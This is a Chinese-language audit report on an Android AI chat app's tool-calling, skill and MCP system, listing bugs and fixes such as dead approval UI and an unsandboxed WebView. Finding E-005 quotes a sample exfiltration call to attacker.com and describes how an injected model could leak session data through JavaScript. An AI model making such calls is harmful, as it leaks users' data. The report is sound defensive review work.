# 审计报告：模块 E — 工具调用系统 + Skill 系统 + MCP

> 只读审计 · 范围：模型发起工具调用 → 解析 → 审批 → 执行 → 结果反馈 的完整链路；Skill 注册/发现/可视化；MCP 连接与调用
> 审计日期：2026-07-05

---

## 审计范围

实际通读并交叉核对的文件清单：

**工具执行核心与编排**
- `ui/chat/manager/ToolExecutor.kt`（工具执行核心：解析参数、调用 Skill、组装结果、回写消息）
- `ui/chat/manager/ApprovalManager.kt`（审批 / 续接 / 干预 / 执行模式）
- `ui/chat/ChatViewModel.kt`（1847 行；工具循环、fallback 解析、审批触发、buildToolList、loopLimit 守卫）

**Skill 注册系统**
- `ui/chat/manager/registry/SkillRegistry.kt`（接口定义）
- `ui/chat/manager/registry/DefaultSkillRegistry.kt`（内置 Skill 注册 + 设置 key 映射）
- `ui/chat/manager/registry/ModularSkillRegistry.kt`（多注册器组合）
- `ui/chat/manager/registry/UserSkillRegistry.kt`（自定义 Skill，**runBlocking** 阻塞 + 沙箱未实现）
- `ui/chat/manager/registry/McpSkillRegistry.kt`（MCP 工具注册）

**Skill 实现（内置）**
- `skills/CalculatorSkill.kt`（手写表达式求值器）
- `skills/CurrentTimeSkill.kt`（已废弃为被动注入）
- `skills/ExecJsSkill.kt`（WebView 执行任意 JS）
- `skills/FileReadSkill.kt`、`FileWriteSkill.kt`、`FilePatchSkill.kt`、`FileDiffSkill.kt`、`FileListSkill.kt`、`FileSearchSkill.kt`
- `skills/ImageGenerationSkill.kt`
- `skills/WebSearchSkill.kt`、`WebSearchTavilySkill.kt`、`WebSearchSearXNGSkill.kt`、`WebFetchSkill.kt`
- `skills/McpSkill.kt`（MCP 工具执行包装）
- `skills/CreateToolSkill.kt`（创建自定义 Skill，但自定义 Skill 沙箱未实现）
- `skills/InitializePlanSkill.kt`、`UpdatePlanSkill.kt`、`GetPlanSkill.kt`、`DropPlanSkill.kt`

**工具定义与解析**
- `data/remote/tools/ProviderToolFactory.kt`（各 provider 原生 web_search/url_context 工具构造）
- `data/remote/lifecycle/ToolCallLifecycleHandler.kt`（工具调用生命周期事件）
- `data/remote/parser/DsmlStreamParser.kt`（DSML 工具调用流式解析）
- `ui/chat/manager/plugins/ToolOrchestrationPlugin.kt`（基于关键词的搜索意图中间件）

**MCP**
- `data/remote/mcp/McpClient.kt`（JSON-RPC over HTTP）
- `data/remote/optimizer/ResultSizeOptimizer.kt`（MCP 多模态结果处理）

**数据层**
- `data/repository/SkillRepository.kt`
- `data/local/db/dao/SkillDao.kt`
- `data/local/db/entity/SkillEntities.kt`（CustomSkillEntity / McpServerEntity）
- `data/repository/FileOperationRepository.kt`（文件操作真实实现，确认 UUID 隔离）
- `data/model/ChatModels.kt`（ApprovalRequest / LoopStatus / SessionOptions）

**UI 可视化**
- `ui/chat/PipelineBubble.kt`（InlineToolRow：工具调用与结果的内联渲染）
- `ui/chat/ChatInlineComponents.kt`（**ApprovalCard / ToolExecutionTimeline 定义但从未被调用**）
- `ui/chat/ChatScreen.kt`（确认审批状态是否被消费）
- `ui/chat/SessionSettingsSheet.kt`（执行模式仅只读展示）
- `ui/settings/SkillsScreen.kt`（loop_limit UI）
- `NexaraApplication.kt`（Skill 注册与注册器装配）

---

## 总体评价

整体设计**抽象分层是合理的**：`SkillDefinition`/`SkillRegistry` 接口把「工具」统一抽象为 `id/name/description/parametersSchema/execute`，`ModularSkillRegistry` 把内置 Skill、用户自定义 Skill、MCP Skill 三个来源组合成一个注册器；`ToolExecutor` 是单一执行入口，负责解析参数、调用 Skill、把结果拼成 `Message(role=TOOL)` 回灌对话；`ProtocolTool` 把 Skill 转成 OpenAI function-calling / Anthropic tools 格式暴露给模型。文件类 Skill 的乐观锁设计（`expectedHash` + `HASH_MISMATCH`）和结构化错误反馈质量是亮点，`FilePatchSkill.formatPatchError` 给出的「请先 read_file 获取当前行数后重试」式指引对模型自我纠错很有帮助。文件操作全部走 `dao.getByUuid(uuid)` 校验，模型无法用文件工具写任意绝对路径——这是正确的安全边界。

但这条链路存在**若干严重影响真实使用体验的硬伤**，集中在四方面：

1. **审批机制对用户完全不可见、不可用**：`ApprovalManager` 在 `semi`/`manual` 执行模式下会暂停生成、设置 `approvalRequest`、把 `loopStatus` 置为 `WAITING_FOR_APPROVAL`，但**`ChatScreen` 从未渲染任何审批 UI**。精心设计的 `ApprovalCard` 组件（带「同意/拒绝」按钮）是死代码，从未被调用。结果就是：当模型在默认的 `semi` 模式下要写文件、执行 JS、生成图片、创建工具时，对话会**静默卡死**——用户看不到要批准什么、没有按钮可点，只能干等或杀进程。这是整个模块**优先级最高**的问题。

2. **自定义 Skill 实际无法执行 + 注册层阻塞主线程**：`UserSkillRegistry` 用 `runBlocking` 在主线程同步查数据库，而 `CustomDatabaseSkill.execute` 直接返回「沙箱未实现」的占位字符串——即用户用 `create_tool` 创建的 Skill 永远跑不起来，模型却被告知「Successfully created tool. You can now use it」，陷入「创建成功 → 调用 → 没真正执行 → 模型以为成功了」的循环。

3. **工具耗时造假 + MCP schema 双重序列化 + 续接预算死代码**：UI 上工具执行的耗时显示是**硬编码的 `1.2s`**（注释写着「Mock for now」），与真实耗时无关；MCP 工具的 `inputSchema` 被 `toString()` 两次，导致传给模型的参数 schema 是被转义的字符串而非合法 JSON；`continuationBudget`/`autoLoopLimit` 这套「续接预算」机制在 `ChatViewModel` 里**零引用**，全是死代码。

4. **ExecJs 安全与稳定性**：`ExecJsSkill` 在 `Dispatchers.Main` 上每次创建一个 `WebView`、`evaluateJavascript` 后只靠 `invokeOnCancellation` 销毁——5 秒超时和正常返回之外，WebView 容易泄漏；且描述里写了「No file system or network access」，但 `allowFileAccess=false` 并不能阻止 WebView 内的 `fetch`/`XMLHttpRequest`（需要额外禁用）。

下面按严重程度展开。

---

## 发现的问题

### 🔴 严重问题（影响核心功能或数据安全）

#### E-001: 审批机制完全不可用——对话会静默卡死（死代码 UI）
- **用户视角描述**：用户用默认的 `semi`（半自动）执行模式，让助手「帮我写一个文件」。模型决定调用 `write_file` 工具，此时系统判定它是高风险工具，暂停生成、等待用户审批。**但屏幕上没有任何审批弹窗、没有「同意/拒绝」按钮、也看不到模型要写哪个文件/什么内容**。对话直接卡住不动，`isGenerating` 被置为 false，用户以为「助手没反应了」，只能反复点发送或杀掉 app。更糟的是：用户即使知道有审批这回事，也找不到任何入口去批准。
- **代码位置**：
  - `ChatViewModel.kt:636-649`：检测到 pending 工具时调用 `approvalManager.setApprovalRequest(...)` 并 `setLoopStatus(WAITING_FOR_APPROVAL)`，然后 `_isGenerating.update { false }` 停止生成
  - `ChatViewModel.kt:970-983`：`approveRequest()` / `rejectRequest()` 方法存在，但**从未被任何 UI 调用**（全仓搜索 `approveRequest(` 的调用点只有定义处）
  - `ChatViewModel.kt:96`：`ChatUiState.approvalRequest` 字段已暴露
  - **`ChatScreen.kt` 全文检索 `approvalRequest` / `approveRequest` / `ApprovalCard` / `WAITING_FOR_APPROVAL` 的消费点为 0**
  - `ChatInlineComponents.kt:1095`：`ApprovalCard`（带 Approve/Decline 按钮、描述文案的完整组件）**定义后从未被任何文件调用**——死代码
- **根因**：`ApprovalManager` 后端逻辑完整（设置请求、`resumeGeneration` 恢复、续接预算累加），但前端渲染层缺失。`ApprovalCard` 组件写好了却没接入 `PipelineBubble` 或 `ChatScreen`。
- **影响范围**：默认 `semi` 模式下，所有 `write_file` / `exec_js` / `generate_image` / `create_tool` 调用都会触发此问题。这些恰好是用户最常用、最高风险的操作。
- **建议**：在 `PipelineBubble` 或 `ChatScreen` 的消息流中，当 `uiState.session?.approvalRequest != null` 或某条 ASSISTANT 消息的 `pendingApprovalToolIds` 非空时，渲染 `ApprovalCard`，并把 `toolName`/`args`（解析后的人类可读描述）传入，绑定 `onApprove → chatViewModel.approveRequest()`、`onDecline → chatViewModel.rejectRequest()`。这是本模块**优先级最高**的修复。

#### E-002: 自定义 Skill 沙箱未实现——`create_tool` 创建的工具永远跑不起来
- **用户视角描述**：用户让助手「帮我创建一个能把数字转成二进制的工具」。模型调用 `create_tool`，系统返回「Successfully created tool: to_binary. You can now use it.」用户以为成功了，让助手用一下这个工具，助手调用 `to_binary`，结果返回的内容是「Custom skill 'to_binary' was called... However, sandbox execution is not yet implemented. Code to execute: function...」。**用户完全看不懂这段话**，会以为是 bug；助手也会困惑（它被告知创建成功、却得到一个「未实现」的结果），可能反复重试或编造结果。
- **代码位置**：
  - `registry/UserSkillRegistry.kt:52-58`：`CustomDatabaseSkill.execute` 直接返回固定占位文案：
    ```kotlin
    content = "Custom skill '$name' was called with args: ... However, sandbox execution is not yet implemented. Code to execute: ${code.take(200)}"
    ```
  - `skills/CreateToolSkill.kt:48`：`create_tool` 返回 `"Successfully created tool: $name. You can now use it."`——承诺了一个根本无法兑现的能力
  - `data/local/db/entity/SkillEntities.kt:14`：`CustomSkillEntity.code` 字段注释明确写「JS or DSL code」
- **根因**：`create_tool` → 存库 → 模型调用 → `UserSkillRegistry` 找到 → `CustomDatabaseSkill.execute` 是占位实现，没有任何 JS/DSL 执行引擎接入。
- **影响**：这是一个「假功能」——UI、数据库、注册器、模型工具定义全链路都通，唯独最后一步执行是空的。会误导用户和模型。
- **建议**：要么补齐沙箱执行（复用 `ExecJsSkill` 的 WebView 机制执行用户 code），要么在 `create_tool` 工具描述里明确标注「实验性」，或在 `UserSkillRegistry.getAllTools` 里**不注册 code 为空的 Skill**，并在 `CreateToolSkill` 返回结果里如实告知「已保存定义，但执行引擎尚未启用」。

#### E-003: `UserSkillRegistry` 用 `runBlocking` 在调用线程上同步阻塞查数据库
- **用户视角描述**：用户每次发消息、每次模型要决定用哪个工具，系统都会在 `getAllTools` / `getSkill` 里**同步阻塞主线程去查 SQLite**（`runBlocking { repository.getAllEnabledCustomSkills() }`）。如果数据库有锁、或 IO 慢，整条工具链路（乃至整个生成流程）会卡顿；在 `buildToolList`（主流程同步路径）里这会直接拖慢首字节响应。
- **代码位置**：
  - `registry/UserSkillRegistry.kt:14`：`override fun getSkill(name: String): SkillDefinition? { val entity = runBlocking { repository.getEnabledCustomSkillByName(name) }; ... }`
  - `registry/UserSkillRegistry.kt:21`：`override fun getAllSkills(): List<SkillDefinition> { val entities = runBlocking { repository.getAllEnabledCustomSkills() }; ... }`
  - `registry/UserSkillRegistry.kt:28`：`getAllTools()` 内部又调用 `getAllSkills()`，再次 `runBlocking`
  - 调用链：`ChatViewModel.buildToolList`（`ChatViewModel.kt:1225`，在 `generateMessage` 主路径同步调用）→ `ModularSkillRegistry.getAllTools` → `UserSkillRegistry.getAllTools` → `runBlocking`
- **根因**：`SkillRegistry` 接口定义为同步（`fun getSkill` / `fun getAllTools` 非 suspend），但数据源是 Room 的 suspend DAO。`UserSkillRegistry` 用 `runBlocking` 强行桥接，违反「不要在主线程 runBlocking」的基本准则。
- **建议**：把 `SkillRegistry` 接口改为 `suspend`，或在 `ChatViewModel` 里缓存自定义 Skill 列表（自定义 Skill 变更时刷新缓存），避免每次构建工具列表都同步查库。

#### E-004: 工具执行耗时是硬编码假数据 `1.2s`
- **用户视角描述**：用户展开工具调用详情，看到每个工具耗时显示「1.2s」。无论是毫秒级的 `current_time`、还是几十秒的图片生成、还是几秒的网页抓取，**全部显示 1.2s**。用户据此判断「这次搜索挺快的」「图片生成只花了 1.2 秒，效率不错」，但这些数字与真实情况毫无关系。当工具真的卡了很久时，用户也看不到真实耗时，无法判断是模型在思考还是工具在执行。
- **代码位置**：
  - `ChatInlineComponents.kt:817-821`：
    ```kotlin
    Text(
        text = "1.2s", // In real app, would come from step.duration
        ...
    )
    ```
    注释明确承认是 Mock。`ExecutionStep` 数据模型里也没有 `duration` / `startedAt` 字段。
  - `ToolExecutor.kt:67-127`：记录 `ExecutionStep` 时只存了 `timestamp`，没有计算开始/结束的时间差。
- **根因**：UI 层造假 + 数据模型缺字段 + 执行层未埋点，三者叠加。
- **建议**：`ExecutionStep` 增加 `startedAt`/`durationMs`；`ToolExecutor` 在 `tool_call` 步骤记录开始时间，在 `tool_result` 步骤计算耗时；UI 取 `step.durationMs` 渲染。

#### E-005: ExecJs 的 WebView 安全与资源泄漏
- **用户视角描述**：用户让助手做点计算/数据处理，模型调用 `exec_js` 执行任意 JS 代码。系统在**主线程**上 `new WebView(appContext)`，`evaluateJavascript` 跑模型给的代码。虽然描述里写「No file system or network access」，但实际只禁了 `allowFileAccess`/`allowContentAccess`，**没有禁用网络**——模型生成的 JS 仍可能用 `fetch('http://attacker.com')` 或 `XMLHttpRequest` 把数据外发。此外 WebView 的销毁依赖 `invokeOnCancellation`，正常返回路径里 `cont.resume` 之后 WebView 没有立即 `destroy()`，若 5 秒超时和正常返回交织，可能泄漏 WebView 实例（WebView 持有 Context，泄漏代价高）。
- **代码位置**：
  - `skills/ExecJsSkill.kt:56-70`：
    ```kotlin
    val output = withTimeoutOrNull(5000L) {
        withContext(Dispatchers.Main) {
            suspendCancellableCoroutine<String> { cont ->
                val wv = WebView(appContext).also {
                    it.settings.javaScriptEnabled = true
                    it.settings.allowFileAccess = false
                    it.settings.allowContentAccess = false
                    // ❌ 未禁用网络：未设置 setBlockNetworkLoads(true) / WebChromeClient 拦截
                }
                wv.evaluateJavascript(wrappedCode) { result ->
                    cont.resume(result ?: "null")  // ❌ resume 后未 wv.destroy()
                }
                cont.invokeOnCancellation { wv.destroy() }
            }
        }
    }
    ```
  - 同文件 `:22-27` 工具描述：「No file system or network access.」——与实现不符
- **根因**：WebView 作为 JS 沙箱本就脆弱（它本质上是个浏览器引擎），且此处没有彻底关闭网络、没有限制可访问的 origin、没有在正常路径销毁。
- **影响**：模型若被注入或自行生成恶意 JS（如 `fetch` 外发会话内容），存在数据外泄风险；WebView 泄漏会导致内存增长。
- **建议**：
  - 立即加 `wv.settings.setBlockNetworkLoads(true)` 并 `wv.setWebChromeClient(null)`/拦截 `shouldInterceptRequest`；
  - 正常返回路径里 `resume` 后立即 `wv.destroy()`（用 try/finally 包裹）；
  - 考虑用更轻量的 JS 引擎（如 `quickjs-android`）替代 WebView 沙箱，避免引入整个浏览器引擎的风险面。

#### E-006: `exec_js` 工具描述自称安全但实现不符（误导模型与用户）
- **用户视角描述**：模型的系统提示里看到 `exec_js` 的描述是「Execute JavaScript code in a sandbox... No file system or network access.」，于是模型会放心地把敏感数据交给它处理（比如「帮我解析这段包含个人信息的 JSON」）。但实际沙箱并不彻底（见 E-005），用户和模型都基于「安全」的前提在使用一个并不完全安全的工具。
- **代码位置**：`skills/ExecJsSkill.kt:22-27` 描述 vs `:59-63` 实现（未禁网络）。
- **根因**：描述与实现脱节。
- **建议**：要么把描述改为如实说明限制（「JS 执行环境，文件系统已禁用，网络受限」），要么把实现补到与描述一致。

---

### 🟡 中等问题（影响体验或正确性，但有 workaround）

#### E-101: MCP 工具参数 schema 双重序列化
- **用户视角描述**：用户接了一个 MCP server（比如 GitHub MCP），系统把它的工具列表同步进来。但传给模型的 `parametersSchema` 是被 `toString()` 两次的字符串——形如 `"{\"type\":\"object\",\"properties\":{...}}"`（外层多了引号、内层引号被转义）。模型收到这个 schema 后，可能**无法正确理解参数结构**，导致调用 MCP 工具时参数格式错误、或干脆不去调用它，转而用自然语言回答，MCP 工具形同虚设。
- **代码位置**：
  - `data/remote/mcp/McpClient.kt:39`：`inputSchema = obj["inputSchema"]?.toString() ?: "{}"` —— `JsonElement.toString()` 已产生合法 JSON 字符串
  - `registry/McpSkillRegistry.kt:51`：`parametersSchema = tool.inputSchema?.toString() ?: "{}"` —— 在已经是 String 的对象上再 `toString()`（此行虽是 no-op，但 McpClient 那一层的双重序列化已经发生：把 JsonElement 当字符串存，后续当作 schema 字符串直接塞进 ProtocolTool.parameters，传给模型的就是被转义的 JSON 字符串）
  - 注意：`McpTool.inputSchema` 类型是 `String`（`McpClient.kt:66`），存的是 `obj["inputSchema"]?.toString()`——对于 `{"type":"object",...}` 这样的 JSON 对象元素，`.toString()` 产出的是 `{"type":"object",...}`（合法），但如果元素本身是字符串类型（少见），则会被多包一层引号。真正的问题在于：这个 schema 字符串随后被原样塞进 `ProtocolToolFunction.parameters`，而 OpenAI/Anthropic 协议期望 `parameters` 是一个 JSON Schema **对象/原文**，传输时通常需保证它是可被服务端再次 `JSON.parse` 的合法 JSON。需核对各 Protocol 序列化路径是否对 `parameters` 做了 `parseToJsonElement`。
- **根因**：`inputSchema` 在 McpClient 层以 `JsonElement.toString()` 序列化为字符串保存，后续没有反向解析为对象，schema 在「字符串↔对象」边界上状态不一致。
- **建议**：`McpTool.inputSchema` 直接保存 `JsonElement`（或解析后的 `JsonObject`），在构造 `ProtocolTool` 时统一序列化；或在使用处 `Json.parseToJsonElement(tool.inputSchema)` 还原为对象再传入。

#### E-102: MCP 客户端无超时、无重试、无健康检查
- **用户视角描述**：用户配了一个远程 MCP server。MCP server 偶尔重启或网络抖动一下，调用 MCP 工具就直接抛异常返回「MCP Error: ...」给模型，模型只能放弃或换方案。MCP server 是否还连着、上次同步是什么时候、工具列表是否过期，用户都看不到，也没有自动重连。
- **代码位置**：
  - `data/remote/mcp/McpClient.kt:53-60`：`call()` 直接 `httpClient.post(serverUrl)`，无 `timeout` 配置、无重试、无断线检测
  - `ui/settings/SettingsViewModel.kt:631-653`：`syncMcpServer` 只在用户手动点「同步」时调用一次 `listTools()`；连接状态 `isConnected` 一旦设为 true 就不再校验，server 实际掉线后 UI 仍显示「已连接」
  - 无任何定期心跳 / 重连逻辑
- **根因**：MCP 同步是一次性的、被动的；运行时没有健康探活。
- **建议**：为 `httpClient` 配置 `requestTimeoutMillis`/`connectTimeoutMillis`；在 `McpSkill.execute` 失败时区分「网络错误」与「工具执行错误」；考虑在 session 启动时自动重连已启用的 MCP server。

#### E-103: `continuationBudget` / `autoLoopLimit` 是死代码——「续接」机制名存实亡
- **用户视角描述**：用户看到审批卡片（如果它能显示的话）上写着「User Approved Continuation (+5 Loops)」，以为批准后会自动多跑 5 轮。实际上 `continuationBudget` 这个字段在 `ChatViewModel` 的生成路径里**从未被读取**，续接预算累加了也没用。真正的循环上限是 SharedPreferences 里的 `loop_limit`（默认 50），与续接无关。
- **代码位置**：
  - `ui/chat/manager/ApprovalManager.kt:105-111`：续接批准时 `continuationBudget = currentBudget + stepSize`
  - **全仓搜索 `continuationBudget` 在 `ChatViewModel.kt` 的引用为 0**（`grep continuationBudget ChatViewModel.kt` 无输出）
  - `ChatViewModel.kt:304-305`：真正生效的循环守卫是 `effectiveLoopLimit = prefs.getInt("loop_limit", 50); if (loopCount >= effectiveLoopLimit) return`
  - `data/model/ChatModels.kt:360-361`：`continuationBudget`/`autoLoopLimit` 字段定义存在，但生成路径不消费
- **根因**：设计了一层「按需续接预算」的机制，但生成循环没有接入它，实际用的是全局 `loop_limit`。
- **影响**：审批续接语义混乱；UI 上展示的「+N Loops」是误导。
- **建议**：要么删除这套死代码（统一用 `loop_limit`），要么在 `generateMessage` 的循环守卫里真正读取 `continuationBudget` 实现分批续接。

#### E-104: 执行模式（auto/semi/manual）无法在会话内切换
- **用户视角描述**：用户发现助手每写个文件都要审批（很烦），想去改成 `auto`（全自动）模式。打开会话设置，看到「工具执行模式：半自动」——**但是这只是只读文本，没有切换控件**。用户找不到任何地方把当前会话改成全自动或全手动。`ApprovalManager.setExecutionMode()` 方法存在，却没有任何 UI 按钮调用它。
- **代码位置**：
  - `ui/chat/SessionSettingsSheet.kt:776-802`：`executionMode` 只用于 `when` 匹配文案后 `Text(modeDesc)` 展示，**没有 onClick / 选择器**
  - `ui/chat/manager/ApprovalManager.kt:116`：`setExecutionMode` 定义存在，**全仓无调用点**
  - `ChatViewModel.kt:1709-1719`：`determinePendingToolIds` 依赖 `executionMode`，但该值只能来自 agent 创建时或默认 `"semi"`
- **根因**：会话级执行模式是只读展示，缺少交互入口。
- **建议**：在 `SessionSettingsSheet` 的执行模式区块加一个三段选择器（auto / semi / manual），调用 `chatViewModel` 新增的 `setExecutionMode(sessionId, mode)` → `ApprovalManager.setExecutionMode`。

#### E-105: 工具调用循环的「无限循环」防护上限默认 50 且 UI 标注「无限」具有误导性
- **用户视角描述**：用户在 Skills 设置页把循环上限加到 100，UI 上显示「无限制」。但实际代码里的守卫是 `if (loopCount >= effectiveLoopLimit) return`，`effectiveLoopLimit` 最大就是 100（UI 限制 `coerceAtMost(100)`）。所以「无限制」其实是「最多 100 轮」——模型跑了 100 轮工具调用后会被强制截断，且**截断时没有任何用户可见提示**（直接静默 return，生成停止），用户会以为助手「做到一半不想做了」。
- **代码位置**：
  - `ui/settings/SkillsScreen.kt:167`：减号按钮 `coerceAtLeast(1)`；`:183` 加号按钮 `coerceAtMost(100)`；`:173` 显示 `if (loopLimit >= 100) "无限制" else "$loopLimit"`
  - `ChatViewModel.kt:304-305`：`effectiveLoopLimit = prefs.getInt("loop_limit", 50); if (loopCount >= effectiveLoopLimit) return` —— 100 时仍会触发 return
  - `ChatViewModel.kt:305`：到达上限后直接 `return`，**不写任何错误/提示消息**，不更新 `loopStatus`
- **根因**：UI 文案与实际行为不符；上限触发缺少用户反馈。
- **建议**：把「无限制」改为「100（上限）」或在到达 `loop_limit` 时向对话注入一条系统消息「已达到工具调用循环上限（N），如需继续请发送新消息」，让用户知道为什么停了。

#### E-106: 错误结果回写模型后，UI 上工具步骤的状态可能滞后/不一致
- **用户视角描述**：工具执行失败时，`ToolExecutor` 会给结果拼一段 `[SYSTEM NOTE]: The tool execution failed...` 鼓励模型重试。但这条 SYSTEM NOTE 是**拼进 `finalContent` 写入 `Message(role=TOOL)` 的**，它同时被塞进了 `ExecutionStep(type="error")` 的 `content`。用户在 UI 展开工具详情时，看到的是「错误信息 + 一大段给模型的指令」（「Do NOT give up... Propose a specific alternative...」），这段话是写给模型看的，对用户来说是噪音，且容易让用户误以为是错误本身的一部分。
- **代码位置**：
  - `ToolExecutor.kt:112-116`：
    ```kotlin
    val finalContent = if (result.status == "error") {
        result.content + "\n\n[SYSTEM NOTE]: The tool execution failed. ... 4. Propose a specific alternative approach immediately."
    } else result.content
    ```
  - 同文件 `:123`：`content = finalContent` 写入 `ExecutionStep`（UI 可见）和 `:133` `content = finalContent` 写入 `Message(role=TOOL)`（喂给模型）
  - `PipelineBubble.kt:627-649`：`InlineToolRow` 展开后展示 `result.content`（即 finalContent），用户会看到这段 SYSTEM NOTE
- **根因**：给模型的引导文案和给用户的错误展示混在同一个字段。
- **建议**：把「给模型的纠错指令」与「给用户的错误描述」分离——`ExecutionStep.content`（UI）只放原始错误，`Message(role=TOOL).content`（模型）才追加 SYSTEM NOTE。

#### E-107: `ToolOrchestrationPlugin` 用硬编码中文关键词猜测搜索意图
- **用户视角描述**：系统里有一个中间件用关键词匹配来决定是否给模型注入 web_search / knowledge_search / memory_search 工具。它只在用户消息包含「搜索」「今天」「最新」「新闻」「最近」「知识库」「之前说」「记住」等**中文关键词**时才注入对应工具。用户用英文提问（"what's the latest news"）或换个说法（"查一下最近的进展"用了"查"而非"搜索"），工具就不会被注入，模型就没有搜索能力。
- **代码位置**：
  - `ui/chat/manager/plugins/ToolOrchestrationPlugin.kt:68-78`：
    ```kotlin
    private fun analyzeIntent(userMessage: String): SearchIntent {
        val lower = userMessage.lowercase()
        return SearchIntent(
            needsWebSearch = lower.contains("搜索") || lower.contains("今天") || lower.contains("最新") || lower.contains("新闻") || lower.contains("最近"),
            needsKnowledgeSearch = lower.contains("知识库") || lower.contains("文档") || lower.contains("之前导入") || lower.contains("资料库"),
            needsMemorySearch = lower.contains("之前说") || lower.contains("记住") || lower.contains("回忆") || lower.contains("之前聊")
        )
    }
    ```
  - 注意：经核对 `ChatViewModel.buildToolList`（`:1207-1226`）实际走的是 `skillRegistry.getAllTools(allowedIds)`，由 Settings 里的 `enabled_skills` 开关决定，**并未经过 `ToolOrchestrationPlugin`**（该 plugin 在中间件链路里但工具注入逻辑被 `buildToolList` 覆盖）。需确认该 plugin 是否实际生效——若未接入主流程则是死代码。
- **根因**：用规则关键词代替让模型自己判断是否需要搜索；关键词集硬编码、仅中文、覆盖窄。
- **建议**：如果保留该 plugin，应直接把搜索类工具始终暴露给模型，由模型根据用户意图自主决定是否调用（这正是 function-calling 的设计初衷）；关键词猜测反而限制了模型能力。

#### E-108: MCP 调用未走 `ResultSizeOptimizer`，多模态结果处理不一致
- **用户视角描述**：项目里有专门的 `ResultSizeOptimizer` 来处理 MCP 返回的多模态内容（图片/音频）和截断（4MB 上限）。但 `McpSkill.execute`（`:18-26`）直接 `result.toString()` 返回，**没有调用 `ResultSizeOptimizer.optimize`**。如果 MCP server 返回一个大文本或图片 base64，会被原样塞进对话，撑爆上下文；图片也不会被正确提取到 `Message.images` 渲染。
- **代码位置**：
  - `skills/McpSkill.kt:18-26`：`val result = mcpClient.callTool(name, jsonArgs); ToolResult(content = result.toString(), ...)` —— 未用 optimizer
  - `data/remote/optimizer/ResultSizeOptimizer.kt`：完整的 `optimize` / `hasMultimodalContent` / `extractImages` 实现，但 `McpSkill` 没调用
- **根因**：优化器与执行器未对接。
- **建议**：`McpSkill.execute` 用 `ResultSizeOptimizer.tryParseResult(result)` 解析，调用 `optimize` 截断文本、`extractImages` 提取图片到 `ToolResult.data`，与 `ImageGenerationSkill` 保持一致的图片回传机制。

---

### 🟢 轻微问题（代码质量/可维护性）

#### E-201: `ToolExecutor.parseArgs` 把 JSON 数组/对象降级为字符串
- **代码位置**：`ToolExecutor.kt:188-222`，特别是 `:212` `else -> result[key] = v.toString()`。
- **问题**：当参数值是 JSON 数组（如 `FilePatchSkill` 的 `operations`）或嵌套对象时，被 `toString()` 转成字符串。下游 Skill（如 `FilePatchSkill.parseOperations`）需要再 parse 回来，多一次序列化往返；若某 Skill 直接 `args["x"] as List<*>` 会失败。
- **影响**：当前各 Skill 都做了兼容（`is String -> raw` / `is List<*> -> ...`），所以能跑，但类型信息丢失，扩展新 Skill 时容易踩坑。
- **建议**：`parseArgs` 对 JSON 数组返回 `List<Any>`、对对象返回 `Map<String,Any>`，保留结构。

#### E-202: `CalculatorSkill` 不支持函数与常量（sin/cos/pi 等）
- **代码位置**：`skills/CalculatorSkill.kt:40-132`，tokenizer 只识别 `+-*/^%()` 和数字（`:52-63`），遇到 `sin`、`sqrt`、`pi` 等会抛 `Unexpected character`。
- **影响**：描述写「Evaluate a mathematical expression」，但模型若传 `sin(0.5)` 或 `2 * pi` 会失败。
- **建议**：扩展 tokenizer 支持标识符与预置函数/常量；或在描述里明确「仅支持四则运算与幂」。

#### E-203: `CurrentTimeSkill` 已废弃但仍注册？
- **代码位置**：`skills/CurrentTimeSkill.kt:17-18` 标 `@Deprecated`，注释说「时间已通过 ContextBuilder 被动注入，无需注册为可调用工具」。
- **核对**：`NexaraApplication.kt:196-216` 的 `presetSkillRegistry` 注册列表里**没有** `CurrentTimeSkill()`，确实未注册。但类仍存在于 skills 目录，易误导。
- **建议**：删除该文件，或迁移到 `deprecated/` 子包。

#### E-204: `FileDiffSkill` 手工拼接 JSON，未用序列化库
- **代码位置**：`skills/FileDiffSkill.kt:24-48`，用 `appendLine("  \"uuid\": \"${result.uuid}\",")` 手拼 JSON，虽有 `escapeJson`（`:51-52`）处理 `content`，但 `uuid`/`hash` 等字段未转义（若含特殊字符会破坏 JSON）。
- **建议**：用 `kotlinx.serialization` 构造 `JsonObject` 后 `toString()`，杜绝手工拼接的转义风险。

#### E-205: `FileSearchSkill` FTS 模式未实现
- **代码位置**：`skills/FileSearchSkill.kt:56-63`，`mode == "name"` 分支实现了按文件名搜索；但参数 schema 里有 `mode: ["name","fts"]`，`searchTree` 里**没有 `mode == "fts"` 分支**——全文搜索模式静默不生效（走不到任何匹配）。
- **影响**：模型若用 `mode:"fts"` 做内容搜索，会得到空结果。
- **建议**：补齐 FTS 分支调用 `workspaceRepo` 的全文搜索能力，或在 schema 里移除 `fts` 选项。

#### E-206: `DefaultSkillRegistry.settingsKeyToSkillId` 映射表与实际注册不完全对应
- **代码位置**：`registry/DefaultSkillRegistry.kt:17-24`，映射表覆盖了 file_read/write/list/search/diff/patch 六个，但 `current_time`、`calculator`、`web_search`、`exec_js`、`generate_image`、`create_tool`、`initialize_plan` 等都不在表里。
- **影响**：`getAllTools(allowedIds)` 对这些 Skill 用 `settingsKeyToSkillId[it] ?: it` 兜底，若设置里的开关 key 与 Skill id 一致则正常；不一致则会被过滤掉。需核对 Settings 页开关 key 是否与各 Skill `id` 完全一致（当前看是一致的，但依赖隐式约定）。
- **建议**：映射表补全或在 `SkillDefinition` 上加一个 `settingsKey` 属性显式声明。

#### E-207: `ApprovalRequest.args` 是原始 JSON 字符串，审批时人类不可读
- **代码位置**：`data/model/ChatModels.kt:237-242` + `ChatViewModel.kt:643-648`：`args = firstPendingTc?.arguments`（原始 JSON 字符串）。
- **问题**：即便 `ApprovalCard` 被接入了 UI，它收到的 `args` 是 `{"uuid":"abc","content":"...","expectedHash":"..."}` 这样的 JSON，需要 UI 层再格式化才能让用户看懂「要写哪个文件、写什么」。
- **建议**：为高风险工具生成人类可读的审批摘要（如「写入文件 example.txt（UUID abc），内容 1234 字节」），或 UI 层按 `toolName` 渲染结构化字段。

---

## 总结：优先级排序

| 优先级 | 编号 | 问题 | 一句话 |
|--------|------|------|--------|
| P0 | E-001 | 审批 UI 死代码 | semi 模式下高风险工具调用会让对话静默卡死，无任何审批入口 |
| P0 | E-002 | 自定义 Skill 沙箱未实现 | create_tool 是假功能，创建的工具永远跑不起来 |
| P0 | E-004 | 工具耗时硬编码 1.2s | 用户看到的工具耗时是假数据 |
| P1 | E-003 | UserSkillRegistry runBlocking | 主线程同步查库，拖慢工具列表构建 |
| P1 | E-005/E-006 | ExecJs 安全与描述不符 | WebView 沙箱未禁网络，描述谎称安全 |
